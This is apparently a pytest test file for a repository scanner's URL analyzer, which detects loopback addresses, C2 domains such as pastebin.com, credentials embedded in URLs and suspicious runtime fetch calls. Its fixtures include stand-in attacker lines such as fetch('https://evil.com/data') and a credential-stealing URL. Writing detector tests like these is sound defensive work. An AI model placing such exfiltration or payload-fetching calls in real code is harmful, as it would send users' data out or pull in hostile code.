"""Additional url_analyzer tests — loopback, C2 matching, embedded auth, safe registry, urlparse error."""
import pytest
from reporeaver.analyzers.url_analyzer import URLNetworkAnalyzer, KNOWN_C2_DOMAINS
from reporeaver.models import FileEntry


@pytest.fixture
def analyzer():
    return URLNetworkAnalyzer()


def _entry(content, path="test.txt"):
    return FileEntry(path=path, size=len(content), hash_sha256="x", is_text=True)


class TestShouldAnalyze:
    def test_text_under_limit(self):
        assert URLNetworkAnalyzer().should_analyze(_entry("hello"))

    def test_binary_skipped(self):
        e = FileEntry(path="x.bin", size=10, hash_sha256="x", is_text=False)
        assert not URLNetworkAnalyzer().should_analyze(e)


class TestLoopbackDetection:
    def test_loopback_address(self, analyzer):
        content = "http://127.0.0.1:8080/secret"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        titles = [f.title for f in res.findings]
        assert any("Suspicious" in t for t in titles)
        descriptions = [f.description for f in res.findings]
        assert any("127.0.0.1" in d for d in descriptions)

    def test_private_ip(self, analyzer):
        content = "http://10.0.0.1/admin"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        descs = [f.description for f in res.findings]
        assert any("10.0.0.1" in d for d in descs)


class TestC2DomainMatching:
    def test_exact_c2_domain(self, analyzer):
        content = "https://pastebin.com/abc123"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        descs = " ".join(f.description for f in res.findings)
        assert "pastebin.com" in descs

    def test_subdomain_of_c2(self, analyzer):
        content = "https://sub.pastebin.com/abc"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        descs = " ".join(f.description for f in res.findings)
        assert "pastebin.com" in descs

    def test_not_c2_partial_match(self, analyzer):
        content = "https://not-pastebin.com/safe"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        descs = " ".join(f.description for f in res.findings)
        assert "pastebin" not in descs


class TestEmbeddedCredentials:
    def test_url_with_userinfo(self, analyzer):
        content = "http://user:pass@evil.com/steal"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        descs = " ".join(f.description for f in res.findings)
        assert "credentials" in descs

    def test_no_credentials_clean(self, analyzer):
        content = "http://example.com/page"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        descs = " ".join(f.description for f in res.findings)
        assert "credentials" not in descs


class TestUrlparseErrorHandling:
    def test_malformed_url_safe(self, analyzer):
        content = "http://%%bad%%url"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        assert len(res.findings) == 0


class TestSafeRegistrySkip:
    def test_registry_skipped(self, analyzer):
        content = "https://registry.npmjs.org/package"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        assert len(res.findings) == 0

    def test_known_cdn_skipped(self, analyzer):
        content = "https://cdn.jsdelivr.net/npm/jquery"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        assert len(res.findings) == 0


class TestRuntimeNetworkApi:
    def test_network_api_detected(self, analyzer):
        content = "fetch('https://evil.com/data')"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        titles = [f.title for f in res.findings]
        assert any("fetch" in t for t in titles)

    def test_safe_network_api_skipped(self, analyzer):
        content = "fetch('https://api.github.com/repos')"
        e = _entry(content)
        res = analyzer.analyze(e, content)
        titles = [f.title for f in res.findings]
        assert all("fetch" not in t for t in titles)

    def test_unknown_url_in_api_call(self, analyzer):
        content = 'fetch("http://evil.example.com/payload")'
        e = _entry(content)
        res = analyzer.analyze(e, content)
        assert len(res.findings) > 0
